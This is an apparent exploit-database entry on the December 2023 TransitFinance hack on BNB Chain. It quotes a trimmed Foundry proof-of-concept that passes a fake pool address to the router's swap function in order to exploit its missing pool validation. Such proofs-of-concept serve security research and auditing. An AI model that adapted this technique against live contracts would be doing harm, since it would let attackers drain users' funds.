# [?] TransitFinance - Lack of Validation Pool

## Summary
Severity: Unknown
Chain: BNB Chain
Component: TransitFinance
Published: 2023-12-20
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-12/TransitFinance_exp.sol
Type: defi-exploit-poc

## Details
Lost: ~110k

```solidity
contract ContractTest is Test {
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    address router = 0x00000047bB99ea4D791bb749D970DE71EE0b1A34;

    address pool_usd_wbnb = 0x36696169C63e42cd08ce11f5deeBbCeBae652050;

    address usd = 0x55d398326f99059fF775485246999027B3197955;

    address wbnb = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;

    address bnb = address(0);

    function setUp() external {
        cheats.createSelectFork("bsc", 34_506_417 - 1);
        deal(address(this), 1);
    }

    function testExploit() public {
        emit log_named_decimal_uint("Balance BNB before attack", address(this).balance, 18);
        emit log_named_decimal_uint("Balance USD of router", IERC20(usd).balanceOf(router), 18);
        uint256[] memory pools = new uint256[](2);
        pools[0] = uint256(uint160(address(this)));
        pools[1] = 452_312_848_583_266_388_373_324_160_500_822_705_807_063_255_235_247_521_466_952_638_073_588_228_176;
        ExactInputV3SwapParams memory params = ExactInputV3SwapParams({
            srcToken: bnb,
            dstToken: bnb,
            dstReceiver: address(this),
            wrappedToken: wbnb,
            amount: 1,
            minReturnAmount: 0,
            fee: 0,
            deadline: block.timestamp,
            pools: pools,
            signature: bytes(""),
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-12/TransitFinance_exp.sol_
